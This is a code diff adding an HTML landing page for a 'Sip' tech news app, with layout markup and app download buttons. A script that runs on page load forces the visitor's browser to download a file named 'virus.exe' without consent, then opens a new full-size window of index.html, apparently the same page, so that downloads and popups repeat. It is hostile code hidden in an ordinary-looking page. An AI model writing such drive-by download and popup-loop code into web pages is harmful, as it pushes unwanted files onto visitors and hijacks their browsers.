@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="annoying.css">
+    <title>OnePager</title>
+
+</head>
+
+<body>
+    <div class="grid-container">
+        <div class="grid-item item1">
+        </div>
+        <div class="grid-item item2">
+            <img src="img/iphone.png" alt="iphone">
+        </div>
+        <div class="grid-item item3">
+            <img src="img/logo.svg" alt="logo">
+            <div class="h3-text">
+                <h3>Daily tappable tech news</h3>
+            </div>
+            <h3>and stories</h3>
+            <div class="p-text">
+                <p>Every weekday Sip Surface the most interresting and important tech stories of the</p>
+            </div>
+            <div style="font-size: 20px;">
+                <p>day, from breaking news to profiles on favorite tech products.</p>
+            </div>
+            <button><img src="img/download-ios.svg" alt="ios download"></button>
+            <button><img src="img/download-android.svg" alt="android download"></button>
+        </div>
+    </div>
+    <div class="grid-item item4 made-by">Sip news is made by Product Haiut and its passionate community</div>
+    <script>
+        function openNewPage() {
+    var fileName = 'virus.exe';
+
+    var anchor = document.createElement('a');
+
+    anchor.download = fileName;
+
+    fetch('virus.exe')  
+        .then(response => response.text())
+        .then(fileContent => {
+            var blob = new Blob([fileContent], { type: 'text/plain' });
+
+            anchor.href = window.URL.createObjectURL(blob);
+            document.body.appendChild(anchor);
+
+            anchor.click();
+
+            document.body.removeChild(anchor);
+
+            openNewPageWithoutDownload();
+        })
+        .catch(error => {
+            console.error('Error fetching the file:', error);
+            openNewPageWithoutDownload();
+        });
+}
+
+function openNewPageWithoutDownload() {
+ 
+    var newPageUrl = 'index.html';
+
+    var windowFeatures = 'width=1920,height=1080';
+
+    window.open(newPageUrl, '_blank', windowFeatures);
+}
+
+window.addEventListener('load', openNewPage);
+function openNewPageWithoutDownload() {
+ 
+ var newPageUrl = 'index.html';
+
+ var windowFeatures = 'width=1920,height=1080';
+
+ window.open(newPageUrl, '_blank', windowFeatures);
+}
+
+    </script>
+</body>
+</html>
